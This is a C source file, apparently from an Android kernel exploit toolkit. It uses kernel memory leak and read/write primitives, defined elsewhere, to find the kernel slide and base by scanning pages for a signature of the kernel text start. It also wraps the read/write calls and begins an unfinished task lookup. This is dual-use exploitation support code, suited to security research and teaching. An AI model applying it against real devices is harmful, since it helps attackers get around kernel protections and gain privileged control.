#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <linux/types.h>

#include <localUtil.h>

#include <krw_util.h>
#include <drv_share.h>

unsigned long off4Text[] =
{
   0x146e0000, // this is a branch instruction, obviously fluctuates between devices
   0x00080000,
   0x03102000, // this qword fluctuates between devices, this is the value for 3a, 4a is 0x2475000
   0x0000000a, 0x00000000, 0x00000000, 0x00000000,
   0x644d5241, 0x00000000, 0x00000000, 0x00000000,
   0x00000000,
};

size_t g_kernelSlide = 0;
size_t g_kernelBase = 0;

int kernel_slide(size_t* a_kernelSlide)
{
   size_t leak_addr = 0;
   size_t kAddrIter = 0;
   size_t textBase = 0;
   int i = 0;
   size_t bufInterp[sizeof(off4Text) / sizeof(size_t)] = {0};
   int result = -1;

   FINISH_IF(g_kernelSlide != 0);

   SAFE_BAIL(kernel_leak(&leak_addr) == -1);
   // leak_addr = bufInterp[0];

   kAddrIter = leak_addr & PAGE_MASK;
   for (i = 0; i < 0x400; i++)
   {
      kernel_read(bufInterp, sizeof(off4Text), kAddrIter);
      if (memcmp(&bufInterp[1], &off4Text[1], sizeof(off4Text) - sizeof(size_t)) == 0)
      {
         textBase = kAddrIter;
         break;
      }
      kAddrIter -= PAGE_SIZE;
   }
   
   g_kernelSlide = textBase - ANDROID_KERNBASE;
   g_kernelBase = textBase;
finish:
   if (a_kernelSlide != 0)
   {
      *a_kernelSlide = g_kernelSlide;
   }
   result = 0;
fail:

   return result;
}

int kernel_base(size_t* a_kernelBase)
{
   int result = -1;

   FINISH_IF(g_kernelBase != 0);

   SAFE_BAIL(kernel_slide(NULL) == -1);

finish:
   if (a_kernelBase != 0)
   {
      *a_kernelBase = g_kernelBase;
   }
   result = 0;
fail:
   return result;
}

int kernel_close()
{
   return 0;
}

int kernel_read_ptr(void* buf, size_t len, size_t offset)
{
   return kernel_read(buf, len, offset);
}

int kernel_write_ptr(void* buf, size_t len, size_t offset)
{
   return kernel_write(buf, len, offset);
}

int get_pid_task(pid_t targ_pid, size_t* task_out)
{
   int result = -1;
   void* init_task = 0;

   init_task = kdlsym("init_task");
   SAFE_BAIL(init_task == 0);

   result = 0;
fail:
   return result;
}